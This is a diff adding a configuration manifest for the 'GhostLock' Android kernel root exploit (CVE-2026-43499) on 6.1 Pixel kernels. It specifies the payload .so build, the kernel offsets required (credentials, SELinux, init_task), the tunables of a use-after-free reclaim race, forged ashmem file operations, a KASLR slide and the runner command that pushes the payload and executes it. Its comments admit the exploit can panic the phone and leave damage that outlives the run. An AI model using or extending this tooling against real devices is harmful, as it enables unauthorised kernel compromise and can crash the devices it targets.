@@ -1,0 +1,229 @@
+# entry.ghostlock@6.1 — GhostLock entry, android14-6.1 variant.
+#
+#   android14-6.1 targets (husky/tegu/lynx/...) compile
+#   cves/cve-2026-43499-ghostlock/61/* (TCP main route, rounded
+#   futex_hash) + the mirrored shared TUs that must live in 61/ so their
+#   #include "common.h" resolves to 61/common.h.
+#
+# THE MIRRORED TUs
+# ----------------
+# 61/pipe.c and 61/preload.c are byte-identical to ../pipe.c and ../preload.c.
+# They must live in 61/ because a quoted #include searches the directory of the
+# INCLUDING FILE before any -I path, so ../pipe.c's `#include "common.h"`
+# resolves to ../common.h (the 6.6 header) even when -I<...>/61 precedes
+# -I<...>.  Measured with `clang -H`, from cves/cve-2026-43499-ghostlock/:
+#
+#     $ clang -I61 -I. -H -fsyntax-only pipe.c
+#     . ./common.h                   <-- not 61/common.h
+#
+# One copy per tree is possible once the family header stops being called
+# "common.h" in both trees.
+
+schema = 1
+kind   = "entry"
+id     = "entry.ghostlock@6.1"
+cve    = "CVE-2026-43499"
+kmi    = ["android14-6.1"]
+
+composed = true
+status   = "composed; hardware-verified on panther"
+
+[build]
+form    = "preload-so"
+entry   = "constructor"
+# Order is load-bearing (STT_FILE order + .rodata string-merge order).
+sources = [
+  "cves/cve-2026-43499-ghostlock/61/main.c",
+  "cves/cve-2026-43499-ghostlock/61/util.c",
+  "cves/kaslr/slide_tracefs.c",
+  "cves/cve-2026-43499-ghostlock/61/fops.c",
+  "cves/cve-2026-43499-ghostlock/61/pipe.c",
+  "cves/cve-2026-43499-ghostlock/61/root.c",
+  "cves/cve-2026-43499-ghostlock/61/preload.c",
+]
+# The 61/ include dir comes first, then the 6.6 dir, then cves/.  61/ has no
+# offset.h and no targets/, so offset.h and targets/<t>/target.h resolve through
+# those; the family header resolves through the including file's own directory.
+includes = ["cves/cve-2026-43499-ghostlock/61", "cves/cve-2026-43499-ghostlock", "cves"]
+depends  = ["cves/cve-2026-43499-ghostlock/61/common.h", "cves/cve-2026-43499-ghostlock/61/kernelsnitch/*.h"]
+defines  = ["APP_PAYLOAD=1"]
+# @OPT@ is substituted with `opt` below.  The app and release variants share one
+# flag list.
+cflags   = ["-fPIC", "@OPT@", "-Wall", "-Wextra", "-Wno-unused-parameter", "-Wno-sign-compare"]
+opt      = ["-O2", "-g0"]
+ldflags  = ["-shared", "-pthread", "-Wl,--no-undefined"]
+output   = "cve-2026-43499-app"
+
+# The artifact runner/scripts/build-payloads.sh actually ships.
+[build.release]
+opt     = ["-Oz", "-g0", "-fno-unwind-tables", "-fno-asynchronous-unwind-tables",
+           "-ffunction-sections", "-fdata-sections"]
+ldflags = ["-shared", "-pthread", "-Wl,--gc-sections", "-Wl,--icf=all", "-s", "-Wl,--no-undefined"]
+output  = "cve-2026-43499-app.release"
+
+[facts]
+header = "cves/targets/{target}/target.h"
+requires = [
+  "OFFSET_H", "BUILD_VARIANT_LABEL", "BUILD_FINGERPRINT",
+  "INIT_TASK", "INIT_TASK_OFF",
+  "ASHMEM_MISC_FOPS", "ASHMEM_MISC_FOPS_OFF", "ASHMEM_FOPS", "ASHMEM_IOCTL",
+  "KMALLOC_CACHES", "KMALLOC_CACHES_OFF",
+  "P0_PAGE_OFFSET", "P0_PHYS_OFFSET", "P0_KERNEL_PHYS_LOAD", "KIMAGE_TEXT_BASE",
+  "PIPE_BUFFER_SIZE", "PIPE_BUFFER_SLOTS",
+  "SLIDE_INIT_TASK_IMAGE", "SLIDE_LOGGERS_0_1_IMAGE", "SLIDE_SYSCTL_BOOTID_IMAGE",
+  "TASK_CRED_OFF", "TASK_REAL_CRED_OFF", "CRED_UID_OFF",
+  "SELINUX_ENFORCING", "SECURITY_HOOK_HEADS",
+  # The 6.1 discriminators; 61/common.h #ifndef-guards all seven, so
+  # requiring them here rejects a 6.6 header.
+  "MM_STRUCT_SZ", "KMALLOC_CGROUP_TYPE", "KMALLOC_CACHE_TYPES",
+  "KMALLOC_PIPE_INDEX", "PSELECT_WAITER_WORD_SHIFT",
+  "RECLAIM_VEHICLE_DEFAULT",
+  # Read by the RECLAIM_VEHICLE precondition below; without it the gate
+  # cannot answer whether tcp-zc is legal here, and refuses rather than guesses.
+  "KERNEL_VERSION_CODE",
+]
+forbids = []
+# Present on akita only; it is the one device that would say 8.  Optional:
+# absence falls back to 61/common.h:73.
+optional = ["KSNITCH_COLLISIONS", "SLIDE_LOGGER_PARENT"]
+
+[properties]
+retry_safe  = true
+# post_slide is "low", not "none": this stage can panic the phone after the run
+# has finished. misc_open() COPIES ashmem_miscs[0].fops into every struct file
+# opened while it is forged, and the page behind that pointer dies with the
+# payload process, so each such file carries a stale f_op that faults on its
+# next touch. Bounding the window is the mitigation -- the restore runs before
+# install_child_root, and the route-page-N and fops-restored step markers
+# measure what is left. Signatures and the outstanding fix:
+# cves/cve-2026-43499-ghostlock/README.md, "Collateral".
+panic_risk  = { pre_slide = "high", post_slide = "low" }
+destructive = ["slide_logger_parent_slot", "ashmem_miscs[0].fops"]
+# restore_fops_ptr_and_owner puts the slot back and zeroes the fake owner word
+# so fops_put() survives. It does not reach struct files already holding the
+# fake pointer; that damage outlives the run and this stage cannot undo it.
+restores    = ["repair_logger_slot", "restore_fops_ptr_and_owner"]
+provides    = ["CAP_SLIDE", "CAP_KRW_C"]
+requires_caps = []
+retains     = ["CAP_KRW_C"]
+
+# ---------------------------------------------------------------------------
+# Tunables — this stage's strategy space, declared as data
+# ---------------------------------------------------------------------------
+# One inline table per knob. This block is the SINGLE authority for the knob
+# set. resolve-recipe.py validates it, derives the build's -D constants from
+# [pselect_map] below, hands the runner the names/types/domains it checks
+# --tunable against, and the payload prints what it resolved so the runner can
+# assert requested == resolved. Adding a knob to the C without adding it here
+# makes it unreachable; adding it here without the C makes the artifact check
+# reject it. Neither can drift silently.
+#
+#   type          "enum" | "int" | "bool"
+#   values        enum only: legal names, in the integer order the target
+#                 header's default_fact uses (index 0 first)
+#   min / max     int only, a literal range
+#   domain        int only, a derived range; "pselect_shift_window" is computed
+#                 from [pselect_map]
+#   default_fact  the macro in cves/targets/<t>/target.h supplying the default
+#   applies_when  "KNOB=value" — the knob is inert unless that holds
+#   requires      per-value build-time precondition over target facts; a target
+#                 that fails it cannot be built with that value at all
+[tunables]
+RECLAIM_VEHICLE = { type = "enum", values = ["pselect", "tcp-zc"], default_fact = "RECLAIM_VEHICLE_DEFAULT", requires = { "tcp-zc" = "KERNEL_VERSION_CODE >= 0x050e00" }, help = "which syscall re-occupies the freed rt_mutex_waiter frame" }
+PSELECT_SHIFT = { type = "int", domain = "pselect_shift_window", default_fact = "PSELECT_WAITER_WORD_SHIFT", applies_when = "RECLAIM_VEHICLE=pselect", help = "the stack_fds word the freed waiter is assumed to land on" }
+PAGE_GEOMETRY = { type = "enum", values = ["pselect", "tcp"], help = "sprayed page geometry; entailed by RECLAIM_VEHICLE, so it has no default_fact — set it only to test a deliberate cross-pairing" }
+MAIN_TCP_ROUTE_ATTEMPTS = { type = "int", min = 1, max = 1000000 }
+MAIN_TCP_ROUTE_DELAY_USEC = { type = "int", min = 0, max = 1000000 }
+MAIN_TCP_ROUTE_ARM_SEQ = { type = "int", min = 1, max = 1000000 }
+MAIN_TCP_PAGE_ATTEMPTS = { type = "int", min = 1, max = 1000 }
+MAIN_TCP_CFI_ATTEMPTS_PER_PAGE = { type = "int", min = 1, max = 1000 }
+MAIN_TCP_POST_GETSOCKOPT_HOLD = { type = "int", min = 0, max = 1000000 }
+MAIN_TCP_RETRY_PIPE_GEOM = { type = "bool" }
+MAIN_TCP_TASK_SLIDE_INIT = { type = "bool" }
+MAIN_TCP_LOG_EACH = { type = "bool" }
+PSELECT_PAGE_ATTEMPTS = { type = "int", min = 1, max = 1000, applies_when = "RECLAIM_VEHICLE=pselect", help = "outer loop: how many times the kernel page is re-sprayed" }
+PSELECT_ROUTE_ATTEMPTS = { type = "int", min = 1, max = 1000000, applies_when = "RECLAIM_VEHICLE=pselect", help = "inner loop: pselect windows per sprayed page" }
+PSELECT_CFI_MISSES_PER_PAGE = { type = "int", min = 1, max = 100000, applies_when = "RECLAIM_VEHICLE=pselect", help = "failed cfi stages tolerated on one page before it is re-sprayed" }
+PSELECT_TIMEOUT_USEC = { type = "int", min = 1000, max = 5000000, applies_when = "RECLAIM_VEHICLE=pselect", help = "how long one window holds the overlay on the kernel stack" }
+PSELECT_ROUTE_DELAY_USEC = { type = "int", min = -1, max = 1000000 }
+PSELECT_CONSUMER_NICE_VALUE = { type = "int", min = -20, max = 19 }
+PSELECT_ACCEPT_NONREADY_CFI = { type = "bool" }
+CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK = { type = "bool" }
+
+# Env the RUNNER injects, not knobs an operator passes. Listed so the set is
+# complete and so --tunable cannot shadow one: render_invoke() puts the base in
+# ahead of any tunable, and these names are refused as --tunable.
+runner_supplied = ["KASLR_BASE", "KASLR_LEAK_ONLY", "RMG_CLIENT_UID",
+                   "RMG_APP_UID", "CVE43499_ROOT_HELPER"]
+
+# The pselect fd_set word map, in one place.
+#
+# core_sys_select() takes nfds and allocates a 256-byte stack_fds; the three
+# input bitmaps are words 0..3*ceil(nfds/64)-1 and the result sets follow,
+# kernel-zeroed. The waiter word map's first entry is `first_word` and its last
+# load-bearing one (`lock`) is `lock_word`, so the legal PSELECT_SHIFT range is
+# [-first_word, 3*ceil(nfds/64)-1 - lock_word]. The C gets all of it as -D:
+# PSELECT_ROUTE_NFDS, PSELECT_MAP_FIRST_WORD, PSELECT_MAP_LOCK_WORD and the
+# derived KNOB_PSELECT_SHIFT_MIN / KNOB_PSELECT_SHIFT_MAX. Change nfds or the
+# map here and both the payload's gate and the runner's validation follow.
+[pselect_map]
+nfds = 320
+first_word = 2
+lock_word = 9
+
+# ---------------------------------------------------------------------------
+# The runner contract — runner/README.md, "Foreign-chain contract"
+# ---------------------------------------------------------------------------
+# The four tables below restate runner/lib/exploit.sh's built-in defaults as
+# data.  ./pixel-ksu-root with no --recipe reads no manifest; `--recipe
+# ghostlock` reads this block.
+
+[invoke]
+# A .so dlopen'ed by `cve-helper --run-payload`
+# (cves/cve-2026-43499-ghostlock/su_daemon.c:975-1026, dispatched at :1028).
+kind = "helper-preload"
+
+# The payload the runner pushes is a prebuilt .so chosen out of
+# artifacts/exploits/ by runner/lib/select.sh from data/targets.json — a device
+# can resolve to a payload built for a different codename on the same kernel.
+artifact_source = "runner"
+dest = "/data/local/tmp/exploit-payload.so"
+mode = "755"
+
+# Generated from the _INVOKE_TMPL_DEFAULT literal in runner/lib/exploit.sh.
+command = "cd @DEV_TMP@; @KASLR_ENV@RMG_CLIENT_UID=@CLIENT_UID@ RMG_APP_UID=@APP_UID@        @DEV_HELPER@ --run-payload @DEV_PAYLOAD@ @DEV_HELPER@ @DEV_LOG@ >/dev/null 2>&1"
+
+# A base cached for the current boot is replayed through @KASLR_ENV@
+# (cves/cve-2026-43499-ghostlock/61/main.c:275-286).
+accepts_base = true
+
+# The default MARK_* set of runner/lib/exploit.sh, as data.  The live classes for
+# GhostLock are PANIC, REFUSED, PASS, MISS and PARKED; the classifier is driven
+# by these patterns.
+[markers]
+pass         = 'slide-kaslr-tracefs-ok pid=[0-9]+ base=[0-9a-f]+'
+gate_fail    = '[A-Z][A-Z0-9_]*_GATE_FAIL'
+restore_pass = '[A-Z][A-Z0-9_]*_RESTORE_PASS'
+restore_bad  = '[A-Z][A-Z0-9_]*_(RESTORE_NOT_PROVEN|RESTORE_UNREACHABLE|RESTORE_FAIL)'
+# Declared so the kill gate stays correct.  Absent, a deadline parks.
+heartbeat    = '[A-Z][A-Z0-9_]*_HEARTBEAT[[:space:]]+seq=[0-9]+'
+# The route summary discriminates "reached root" from "did not"; the count is
+# cfi-miss LINES, one per page that took a miss.
+diag         = '(tcp|pselect) route done=[0-9]+.*'
+diag_count   = 'cfi misses=[0-9]+'
+
+# Empty: cve-helper's early bails return `errno ? errno : <fixed>`
+# (cves/cve-2026-43499-ghostlock/su_daemon.c:1000-1010), so no exit status of
+# this loader carries an outcome.
+[exit_map]
+
+# The KASLR base, from the `pass` marker above.
+[provides]
+caps  = ["CAP_SLIDE", "CAP_KRW_C"]
+field = 'base=[0-9a-f]+'
+label = "base"
+
+# Setup, run before each shot. GhostLock's reclaim race is far easier on a
+# freshly booted device, so its one setup step is a reboot to a clean boot.
+[[setup]]
+reboot = true
